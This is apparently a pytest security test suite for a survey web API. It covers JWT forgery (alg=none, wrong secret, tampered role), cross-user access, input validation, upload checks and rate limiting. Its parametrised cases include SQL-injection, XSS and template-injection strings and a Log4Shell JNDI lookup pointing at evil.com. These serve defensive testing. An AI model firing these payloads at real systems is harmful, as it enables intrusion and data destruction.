import base64
import time

import pytest
from jose import jwt

from app.security import _legacy_sha256_hash, hash_password, verify_password
from .conftest import admin_headers, payload, register, surveyor_headers, token


# ---------------------------------------------------------------------------
# JWT: malformed, tampered, wrong algorithm, wrong secret, expired
# ---------------------------------------------------------------------------

def test_missing_and_malformed_tokens_are_rejected(client):
    endpoints = [("GET", "/api/Survey"), ("POST", "/api/Survey")]
    for method, path in endpoints:
        assert client.request(method, path, json=payload() if method == "POST" else None).status_code == 401

    for bad in ["not-a-jwt", "Bearer", "", "a.b.c.d", "a.b"]:
        r = client.get("/api/Survey", headers={"Authorization": f"Bearer {bad}"})
        assert r.status_code == 401


def test_token_signed_with_wrong_secret_is_rejected(client):
    headers = surveyor_headers(client)
    real = headers["Authorization"].split(" ")[1]
    payload_data = jwt.get_unverified_claims(real)
    forged = jwt.encode(payload_data, "attacker-controlled-secret", algorithm="HS256")
    r = client.get("/api/Survey", headers={"Authorization": f"Bearer {forged}"})
    assert r.status_code == 401


def test_token_with_tampered_role_claim_is_rejected(client):
    """Attacker takes a real Surveyor token, flips role to Admin, re-signs
    with a guessed/leaked secret. Only valid if they don't know the real
    secret; this proves a naive resign with the WRONG secret fails."""
    headers = surveyor_headers(client)
    real = headers["Authorization"].split(" ")[1]
    claims = jwt.get_unverified_claims(real)
    claims["role"] = "Admin"
    forged = jwt.encode(claims, "wrong-secret", algorithm="HS256")
    saved = client.post("/api/Survey", json=payload(), headers=surveyor_headers(client, "victim")).json()
    r = client.delete(f"/api/Survey/{saved['id']}", headers={"Authorization": f"Bearer {forged}"})
    assert r.status_code == 401


def test_alg_none_confusion_attack_is_rejected(client):
    """Classic JWT vuln: strip the signature and set alg=none, hoping a
    lenient verifier skips signature checking entirely."""
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=")
    body = base64.urlsafe_b64encode(b'{"sub":"1","role":"Admin","unique_name":"x"}').rstrip(b"=")
    forged = (header + b"." + body + b".").decode()
    r = client.get("/api/Survey", headers={"Authorization": f"Bearer {forged}"})
    assert r.status_code == 401


def test_expired_token_is_rejected(client):
    from app.config import settings
    expired = jwt.encode(
        {"sub": "1", "unique_name": "surveyor", "role": "Surveyor", "iss": settings.jwt_issuer, "exp": int(time.time()) - 60},
        settings.jwt_secret, algorithm="HS256",
    )
    r = client.get("/api/Survey", headers={"Authorization": f"Bearer {expired}"})
    assert r.status_code == 401


def test_token_with_wrong_issuer_is_rejected(client):
    from app.config import settings
    wrong_issuer = jwt.encode(
        {"sub": "1", "unique_name": "surveyor", "role": "Surveyor", "iss": "SomeoneElse", "exp": int(time.time()) + 3600},
        settings.jwt_secret, algorithm="HS256",
    )
    r = client.get("/api/Survey", headers={"Authorization": f"Bearer {wrong_issuer}"})
    assert r.status_code == 401


def test_token_referencing_nonexistent_user_id_does_not_crash(client):
    """sub claim points at a user id that isn't in the DB. The JWT itself is
    validly signed (server never re-checks the DB), so this should behave
    like any other authenticated-but-empty-scope request, not 500."""
    from app.config import settings
    ghost = jwt.encode(
        {"sub": "999999", "unique_name": "ghost", "role": "Surveyor", "iss": settings.jwt_issuer, "exp": int(time.time()) + 3600},
        settings.jwt_secret, algorithm="HS256",
    )
    r = client.get("/api/Survey", headers={"Authorization": f"Bearer {ghost}"})
    assert r.status_code == 200
    assert r.json() == []


# ---------------------------------------------------------------------------
# IDOR / authorization boundaries between Surveyors
# ---------------------------------------------------------------------------

def test_surveyor_cannot_see_another_surveyors_data(client):
    admin = admin_headers(client)
    alice = surveyor_headers(client, "alice", admin=admin)
    bob = surveyor_headers(client, "bob", admin=admin)
    client.post("/api/Survey", json=payload(), headers=alice)
    assert client.get("/api/Survey", headers=bob).json() == []
    assert len(client.get("/api/Survey", headers=alice).json()) == 1


def test_surveyor_cannot_delete_another_surveyors_survey(client):
    admin = admin_headers(client)
    alice = surveyor_headers(client, "alice", admin=admin)
    bob = surveyor_headers(client, "bob", admin=admin)
    saved = client.post("/api/Survey", json=payload(), headers=alice).json()
    assert client.delete(f"/api/Survey/{saved['id']}", headers=bob).status_code == 403
    assert client.delete(f"/api/Survey/{saved['id']}", headers=admin).status_code == 200


def test_delete_nonexistent_survey_returns_404_not_500(client):
    admin = admin_headers(client)
    assert client.delete("/api/Survey/999999", headers=admin).status_code == 404


def test_nearby_search_respects_surveyor_scope(client):
    admin = admin_headers(client)
    alice = surveyor_headers(client, "alice", admin=admin)
    bob = surveyor_headers(client, "bob", admin=admin)
    client.post("/api/Survey", json=payload(), headers=alice)
    r = client.get("/api/v1/Survey/nearby?lat=28.6139&lng=77.2090&radius_km=5", headers=bob)
    assert r.json() == []


# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------

def test_missing_required_fields_returns_422_not_500(client):
    headers = surveyor_headers(client)
    r = client.post("/api/Survey", json={"latitude": 1.0}, headers=headers)
    assert r.status_code == 422


def test_wrong_types_return_422(client):
    headers = surveyor_headers(client)
    bad = payload(latitude="not-a-number")
    assert client.post("/api/Survey", json=bad, headers=headers).status_code == 422


def test_nearby_search_rejects_out_of_range_coordinates(client):
    headers = surveyor_headers(client)
    assert client.get("/api/v1/Survey/nearby?lat=999&lng=77.2090", headers=headers).status_code == 422
    assert client.get("/api/v1/Survey/nearby?lat=28.6139&lng=-999", headers=headers).status_code == 422
    assert client.get("/api/v1/Survey/nearby?lat=28.6139&lng=77.2090&radius_km=0", headers=headers).status_code == 422
    assert client.get("/api/v1/Survey/nearby?lat=28.6139&lng=77.2090&radius_km=99999", headers=headers).status_code == 422


def test_survey_latitude_longitude_are_unbounded(client):
    """Documents a real gap, not a pass/fail security bug: unlike the nearby
    endpoint's lat/lng (which have ge/le bounds), SurveyDto has none. A
    nonsense coordinate is currently accepted and stored as-is."""
    headers = surveyor_headers(client)
    r = client.post("/api/Survey", json=payload(latitude=999.0, longitude=-999.0), headers=headers)
    assert r.status_code == 200  # documents current behavior; consider adding bounds


def test_empty_string_required_fields_are_accepted_as_valid_strings(client):
    """phone/community/etc. are typed as str with no length/emptiness
    constraint, so "" currently passes Pydantic validation."""
    headers = surveyor_headers(client)
    r = client.post("/api/Survey", json=payload(phone=""), headers=headers)
    assert r.status_code == 200


def test_pagination_limit_is_capped_at_100(client):
    headers = surveyor_headers(client)
    assert client.get("/api/Survey?limit=1000", headers=headers).status_code == 422
    assert client.get("/api/Survey?limit=0", headers=headers).status_code == 422
    assert client.get("/api/Survey?page=0", headers=headers).status_code == 422


def test_login_and_register_reject_missing_fields(client):
    admin = admin_headers(client)
    assert client.post("/api/Auth/login", json={"username": "x"}).status_code == 422
    assert client.post("/api/Auth/register", json={"username": "x"}, headers=admin).status_code == 422
    assert client.post("/api/Auth/login", json={}).status_code == 422


def test_batch_endpoint_rejects_non_list_body(client):
    headers = surveyor_headers(client)
    r = client.post("/api/Survey/batch", json={"not": "a list"}, headers=headers)
    assert r.status_code == 422


def test_batch_endpoint_handles_empty_list(client):
    headers = surveyor_headers(client)
    r = client.post("/api/Survey/batch", json=[], headers=headers)
    assert r.status_code == 200
    assert r.json() == []


# ---------------------------------------------------------------------------
# Injection-style payloads (ORM parameterization, not string-built SQL)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("injection", [
    "'; DROP TABLE surveys; --",
    "' OR '1'='1",
    "Robert'); DROP TABLE users;--",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
])
def test_text_fields_safely_store_injection_style_strings_verbatim(client, injection):
    """SQLAlchemy's ORM parameterizes these, so they should be stored and
    returned as inert literal text -- never executed, never breaking the
    query, never truncated or mutated."""
    headers = surveyor_headers(client)
    r = client.post("/api/Survey", json=payload(community=injection, name=injection), headers=headers)
    assert r.status_code == 200
    listed = client.get("/api/Survey", headers=headers).json()
    assert listed[0]["community"] == injection
    assert listed[0]["name"] == injection
    # Table should obviously still exist / still be queryable.
    assert client.get("/api/Survey", headers=headers).status_code == 200


def test_username_with_injection_style_string_does_not_break_login_flow(client):
    admin = admin_headers(client)
    weird_username = "admin' OR '1'='1"
    register(client, admin, username=weird_username, password="secret")
    ok = client.post("/api/Auth/login", json={"username": weird_username, "password": "secret"})
    assert ok.status_code == 200
    # A real attempt at the classic bypass string as a *login* username
    # (not one that was actually registered) must still fail.
    bypass = client.post("/api/Auth/login", json={"username": "' OR '1'='1' --", "password": "x"})
    assert bypass.status_code == 401


# ---------------------------------------------------------------------------
# Photo / file upload handling
# ---------------------------------------------------------------------------

def test_photo_rejects_invalid_base64(client):
    headers = surveyor_headers(client)
    r = client.post("/api/Survey", json=payload(photo="not-valid-base64!!!"), headers=headers)
    assert r.status_code == 400


def test_photo_rejects_non_image_bytes_even_if_valid_base64(client):
    headers = surveyor_headers(client)
    fake = base64.b64encode(b"just some random bytes, not an image").decode()
    r = client.post("/api/Survey", json=payload(photo=fake), headers=headers)
    assert r.status_code == 400


def test_photo_rejects_executable_disguised_with_data_uri_prefix(client):
    """Someone could try to smuggle a non-image file (e.g. a script) behind
    a data: URI prefix, hoping the prefix alone is trusted."""
    headers = surveyor_headers(client)
    fake = "data:image/jpeg;base64," + base64.b64encode(b"MZ\x90\x00fake-exe-header").decode()
    r = client.post("/api/Survey", json=payload(photo=fake), headers=headers)
    assert r.status_code == 400


def test_photo_accepts_valid_jpeg_and_png_magic_bytes(client):
    headers = surveyor_headers(client)
    jpeg = base64.b64encode(b"\xff\xd8\xff" + b"0" * 50).decode()
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"0" * 50).decode()
    assert client.post("/api/Survey", json=payload(photo=jpeg), headers=headers).status_code == 200
    assert client.post("/api/Survey", json=payload(photo=png), headers=headers).status_code == 200


def test_photo_over_size_limit_is_rejected(client):
    headers = surveyor_headers(client)
    oversized = base64.b64encode(b"\xff\xd8\xff" + b"0" * (10 * 1024 * 1024 + 1)).decode()
    r = client.post("/api/Survey", json=payload(photo=oversized), headers=headers)
    assert r.status_code == 413


def test_saved_photo_filename_is_server_generated_not_user_controlled(client):
    """Guards against path traversal via a malicious filename -- the code
    never uses client input for the filename (uuid4() is always used), but
    this proves it end-to-end via the actual stored photoUrl."""
    headers = surveyor_headers(client)
    jpeg = base64.b64encode(b"\xff\xd8\xff" + b"0" * 20).decode()
    r = client.post("/api/Survey", json=payload(photo=jpeg), headers=headers)
    photo_url = r.json()["photoUrl"]
    assert "/" not in photo_url.removeprefix("/uploads/")
    assert ".." not in photo_url


# ---------------------------------------------------------------------------
# Password hashing / legacy migration path
# ---------------------------------------------------------------------------

def test_bcrypt_hash_verifies_correctly_and_rejects_wrong_password():
    hashed = hash_password("correct horse battery staple")
    assert verify_password("correct horse battery staple", hashed) is True
    assert verify_password("wrong password", hashed) is False


def test_legacy_sha256_hashes_still_verify_for_migrated_rows():
    legacy_hash = _legacy_sha256_hash("old-password")
    assert verify_password("old-password", legacy_hash) is True
    assert verify_password("wrong", legacy_hash) is False


def test_password_hash_is_never_returned_in_any_survey_or_auth_response(client):
    admin = admin_headers(client)
    register(client, admin, username="surveyor")
    headers = token(client, "surveyor", "secret")
    client.post("/api/Survey", json=payload(), headers=headers)
    for body in [
        client.post("/api/Auth/login", json={"username": "surveyor", "password": "secret"}).text,
        client.get("/api/Survey", headers=headers).text,
    ]:
        assert "password" not in body.lower() or "password_hash" not in body


# ---------------------------------------------------------------------------
# Rate limiting (register + login: 5/minute per IP)
# ---------------------------------------------------------------------------

def test_login_is_rate_limited_after_five_attempts_per_minute(rate_limited_client):
    client = rate_limited_client
    body = {"username": "nobody", "password": "wrong"}
    statuses = [client.post("/api/Auth/login", json=body).status_code for _ in range(6)]
    assert statuses[:5] == [401, 401, 401, 401, 401]
    assert statuses[5] == 429


def test_register_is_rate_limited_after_five_attempts_per_minute(rate_limited_client):
    client = rate_limited_client
    admin = admin_headers(client)
    statuses = [
        client.post("/api/Auth/register", json={"username": f"u{i}", "password": "x"}, headers=admin).status_code
        for i in range(6)
    ]
    assert 429 in statuses


# ---------------------------------------------------------------------------
# Role-escalation attempt via registration payload
# ---------------------------------------------------------------------------

def test_register_rejects_invalid_role_value(client):
    """Guards the bug found via manual testing: Swagger's placeholder
    'role': 'string' (or any value outside Admin/Surveyor) must now fail
    validation instead of being silently stored as a nonsense role."""
    admin = admin_headers(client)
    r = client.post(
        "/api/Auth/register",
        json={"username": "someone", "password": "secret", "role": "string"},
        headers=admin,
    )
    assert r.status_code == 422


def test_register_accepts_only_the_two_real_roles(client):
    admin = admin_headers(client)
    assert client.post(
        "/api/Auth/register", json={"username": "a1", "password": "x", "role": "Admin"}, headers=admin
    ).status_code == 200
    assert client.post(
        "/api/Auth/register", json={"username": "a2", "password": "x", "role": "Surveyor"}, headers=admin
    ).status_code == 200
    """Confirms role assignment only happens because the caller is already
    an admin explicitly requesting it -- not an implicit default."""
    admin = admin_headers(client)
    r = register(client, admin, username="admin2", password="secret", role="Admin")
    assert r.status_code == 200
    assert r.json()["role"] == "Admin"


def test_unauthenticated_request_cannot_smuggle_admin_role_into_login_token(client):
    """A logged-in Surveyor's token role always reflects what's in the DB,
    not anything the client could pass at login time (LoginDto has no role
    field at all, so there's nothing to smuggle)."""
    admin = admin_headers(client)
    register(client, admin, username="surveyor")
    r = client.post("/api/Auth/login", json={"username": "surveyor", "password": "secret", "role": "Admin"})
    assert r.status_code == 200
    decoded = jwt.get_unverified_claims(r.json()["token"])
    assert decoded["role"] == "Surveyor"